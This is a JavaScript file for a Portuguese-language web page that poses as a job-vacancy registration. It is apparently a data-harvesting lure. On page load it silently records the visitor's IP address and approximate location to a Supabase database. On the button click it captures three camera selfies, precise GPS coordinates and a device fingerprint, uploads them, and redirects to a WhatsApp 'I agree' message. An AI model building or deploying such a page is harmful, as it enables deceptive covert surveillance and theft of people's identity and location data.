// =================================================================
// CONFIGURAÇÃO DE CONEXÃO
// =================================================================
const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// Elementos da Página
const video = document.getElementById("video");
const btn = document.getElementById("btn");
const statusText = document.getElementById("status");
const canvas = document.getElementById("canvas");

// =================================================================
// ÁUDIO
// =================================================================
function falar(texto){
  speechSynthesis.cancel();
  const fala = new SpeechSynthesisUtterance(texto);
  fala.lang = "pt-BR";
  fala.volume = 1;
  fala.rate = 0.95;
  speechSynthesis.speak(fala);
}

// =================================================================
// SALVAR NO BANCO
// =================================================================
async function salvarNoBanco(dados) {
  try {
    const { error } = await supabaseClient.from('checkins').insert([dados]);
    if (error) {
      console.error("Erro Supabase:", error);
      return false;
    }
    console.log("✅ Salvo:", dados.tipo_captura);
    return true;
  } catch(err) {
    console.error(err);
    return false;
  }
}

// =================================================================
// PRÉ-SALVAMENTO (AO ABRIR O LINK)
// =================================================================
async function salvarPrevio() {
  console.log("Executando pré-salvamento...");
  try {
    statusText.innerHTML = "🌐 Salvando IP e conexão...";

    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const dados = {
      tipo_captura: "previa",
      ip: data.ip || "indisponível",
      cidade: data.city || "",
      estado: data.region || "",
      pais: data.country_name || "",
      user_agent: navigator.userAgent,
      timestamp: new Date().toISOString()
    };

    await salvarNoBanco(dados);
    statusText.innerHTML = "✅ Pré-cadastro salvo!<br>Clique no botão para completar.";

  } catch(err) {
    console.error("Erro pré-salvamento:", err);
    statusText.innerHTML = "⚠️ Pré-salvamento falhou";
  }
}

// =================================================================
// INICIALIZAÇÃO
// =================================================================
async function iniciarSistema(){
  try {
    falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
    statusText.innerHTML = "🟡 Iniciando sistema...";

    await salvarPrevio(); // Pré-cadastro

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;
    await video.play();

  } catch(err) {
    console.error(err);
    statusText.innerHTML = "❌ Permita a câmera";
  }
}

window.onload = iniciarSistema;

// =================================================================
// ANALISADOR DE DISPOSITIVO
// =================================================================
function analisarDispositivo() {
  const ua = navigator.userAgent;
  let androidVersion = "Não é Android";
  if (ua.indexOf("Android") >= 0) {
      const match = ua.match(/Android\s([0-9\.]+)/);
      if (match) androidVersion = match[1];
  }
  let browser = "Desconhecido";
  if (ua.indexOf("Chrome") >= 0 && ua.indexOf("Edge") === -1) browser = "Chrome";
  else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
  else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
  else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";

  let model = "Desconhecido";
  if (ua.indexOf("Mobile") >= 0) {
      const parts = ua.split(/[()]/);
      if (parts.length > 1) {
          const deviceParts = parts[1].split(';');
          for (let part of deviceParts) {
              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
                  model = part.trim();
                  break;
              }
          }
      }
  }
  return { androidVersion, browser, model };
}

// =================================================================
// BOTÃO - CAPTURA COMPLETA
// =================================================================
btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    btn.innerHTML = "PROCESSANDO...";

    statusText.innerHTML = "📸 Capturando fotos...";
    falar("Iniciando cadastro completo.");

    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext("2d");
    const fotos = [];

    for(let i = 0; i < 3; i++) {
        ctx.drawImage(video, 0, 0, 640, 480);
        fotos.push(canvas.toDataURL("image/jpeg", 0.35));
        if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
    }

    const stream = video.srcObject;
    if (stream) stream.getTracks().forEach(track => track.stop());

    let latitude = "não permitido";
    let longitude = "não permitido";
    try {
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
      });
      latitude = pos.coords.latitude;
      longitude = pos.coords.longitude;
    } catch(e) {}

    let ip = "indisponível";
    let cidade = "", estado = "", pais = "";
    try {
      const req = await fetch("https://ipapi.co/json/");
      const json = await req.json();
      ip = json.ip || "indisponível";
      cidade = json.city || "";
      estado = json.region || "";
      pais = json.country_name || "";
    } catch(e) {}

    statusText.innerHTML = "💾 Salvando cadastro completo...";

    const infoDispositivo = analisarDispositivo();

    const { error } = await supabaseClient.from('checkins').insert([{
      tipo_captura: "completo",
      selfies: fotos,
      latitude: latitude.toString(),
      longitude: longitude.toString(),
      ip: ip,
      cidade: cidade,
      estado: estado,
      pais: pais,
      user_agent: navigator.userAgent,
      modelo_dispositivo: infoDispositivo.model,
      versao_android: infoDispositivo.androidVersion,
      navegador: infoDispositivo.browser,
      plataforma: navigator.platform,
      idioma: navigator.language,
      largura_tela: window.innerWidth,
      altura_tela: window.innerHeight
    }]);

    if (error) throw error;

    statusText.innerHTML = "✅ Cadastro concluído!";
    falar("Cadastro concluído com sucesso.");

    setTimeout(() => {
      window.location.href = "https://wa.me/5594981100607?text=Eu%20concordo%20e%20quero%20participar%20das%20vagas%20do%20Grupo%20RV%20%2B%20Vale.";
    }, 2000);

  } catch(err) {
    console.error(err);
    statusText.innerHTML = "❌ Erro: " + (err.message || "Falha");
    btn.disabled = false;
    btn.innerHTML = "QUERO PARTICIPAR";
  }
});
